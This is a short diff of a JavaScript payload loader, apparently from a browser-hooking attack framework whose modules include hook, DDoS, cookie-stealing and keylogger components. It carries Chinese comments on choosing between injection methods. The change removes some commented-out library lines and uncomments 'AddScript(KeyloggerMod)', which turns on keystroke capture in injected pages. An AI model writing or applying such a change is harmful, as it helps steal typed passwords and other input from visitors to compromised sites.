@@ -44,10 +44,7 @@ try {
     //InjectScript 和 AddScript 都不是很稳定,看情况选用 
     
     //InjectScript(BaseLib);
-    //InjectScript(Base64Lib);
     //InjectScript(UtfLib);
-    //InjectScript(AjaxLib);
-    //InjectScript(HookLib);
     //InjectScript(JqueryLib);
     
     //InjectScript(ClxMod);
@@ -60,10 +57,7 @@ try {
     
     ///////////////////////////////////////////////////
     AddScript(BaseLib);
-    //AddScript(Base64Lib);
     //AddScript(UtfLib);
-    //AddScript(AjaxLib);
-    //AddScript(HookLib);
     AddScript(JqueryLib);
     
     AddScript(ClxMod);
@@ -72,7 +66,7 @@ try {
     //AddScript(BoomerangMod); 可以不用在feed.js里加,xcookie模块会自动判断浏览器并添加
     //AddScript(DdosMod);
     AddScript(HookMod);
-    //AddScript(KeyloggerMod);
+    AddScript(KeyloggerMod);
 }
 catch (e){
     //alert(e);
